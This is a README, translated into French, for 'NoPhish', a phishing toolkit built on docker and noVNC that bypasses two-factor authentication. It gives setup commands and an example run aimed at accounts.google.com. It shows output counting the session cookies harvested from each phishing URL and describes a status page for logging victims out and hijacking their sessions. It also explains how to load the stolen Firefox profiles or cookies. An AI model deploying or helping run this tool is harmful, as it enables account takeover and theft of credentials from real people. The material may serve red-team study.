# NoPhish
 
Un autre kit d'outils de phishing qui fournit une infrastructure basée sur docker et noVNC. L'ensemble de la configuration est basé sur l'article initial de [mrd0x](https://mrd0x.com/bypass-2fa-using-novnc/) et [fhlipzero](https://fhlipzero.io/blogs/6_noVNC/noVNC.html).

Une description détaillée de la configuration est disponible ici - [Another phishing tool](https://powerseb.github.io/posts/Another-phishing-tool/)

## Installation

Assurez-vous que docker est installé et fonctionne.

Installez les modules python requis :

```console
pip install lz4
```

Installez la configuration (qui créera les images Docker requises) :

```console
setup.sh install
```

## Exécution

La configuration offre les paramètres suivants :

```console
Usage: ./setup.sh -u No. Users -d Domain -t Target
         -u Number of users - please note for every user a container is spawned so don't go crazy
         -d Domain which is used for phishing
         -t Target website which should be displayed for the user
         -e Export format
         -s true / false if ssl is required - if ssl is set crt and key file are needed
         -c Full path to the crt file of the ssl certificate
         -k Full path to the key file of the ssl certificate
         -a Adjust default user agent string
         -z Compress profile to zip - will be ignored if parameter -e is set
         -p Additional URL parameters - if not set generic URL will be generated

```

Un fonctionnement de base ressemble à ce qui suit :

```console
./setup.sh -u 4 -t https://accounts.google.com -d hello.local 
```

Pendant l'exécution, l'aperçu suivant fournit un état par URL du nombre de cookies ou d'informations de session collectés.

```console
...
[-] Starting Loop to collect sessions and cookies from containers
    Every 60 Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop..
For the url http://hello.local/v1/oauth2/authorize?access-token=b6f13b93-1b51-41c4-b8b4-b07932a45bd6 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v2/oauth2/authorize?access-token=fd54dbec-c057-4f46-8657-c0283e5661d9 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v3/oauth2/authorize?access-token=9d606939-b805-4c65-9e98-2624de2cd431 :
-  0  cookies have been collected.
-  5  session cookies have been collected.
For the url http://hello.local/v4/oauth2/authorize?access-token=84b8d725-7e87-439e-8629-53332092b68f :
-  0  cookies have been collected.
-  5  session cookies have been collected.
```

Veuillez noter que l'outil exportera tous les cookies / informations de session même lorsqu'ils ne sont pas liés à une connexion réussie.

De plus, vous pouvez également interagir directement avec l'outil sur la page de statut - `http(s)://%DOMAIN%:65534/status.php`. Là, vous avez la possibilité de déconnecter l'utilisateur et de prendre directement le contrôle de la session.

Dans la version actuelle de l'outil, deux conteneurs sont lancés pour chaque utilisateur - un pour les ordinateurs de bureau et un pour les appareils mobiles. En fonction de l'agent utilisateur, la cible est redirigée vers le conteneur approprié. La sortie du conteneur mobile est nommée avec un "m" en tête (par exemple mphis1-ffprofile).

## Utilisation de l'export de profil
Si vous utilisez l'export complet du profil FireFox, vous pouvez simplement appeler firefox avec -profile comme suit :

Sous Windows :
`& 'C:\Program Files\Mozilla Firefox\firefox.exe' -profile <PathToProfile>\phis1-ffprofile\`

Sous Linux :
`firefox-esr -profile <PathToProfile>/phis1-ffprofile --allow-downgrade`

Tout est restauré, y compris le dernier site visité.

Veuillez noter que par défaut, vous devez extraire l'archive zip ou définir le paramètre `-z` à `false`. Si le format d'export `-e simple` est choisi, deux fichiers json seront générés et peuvent être utilisés avec Cookiebro disponible pour [Firefox](https://addons.mozilla.org/de/firefox/addon/cookiebro/) et [Chrome](https://chrome.google.com/webstore/detail/cookiebro/lpmockibcakojclnfmhchibmdpmollgn).


## Nettoyage

Pendant une exécution, le script peut être interrompu avec `ctrl` + `c` - tous les conteneurs docker en cours seront alors supprimés. Pour supprimer complètement l'installation, exécutez `setup.sh cleanup`.


---

Tranlated By [Open Ai Tx](https://github.com/OpenAiTx/OpenAiTx) | Last indexed: 2025-07-29

---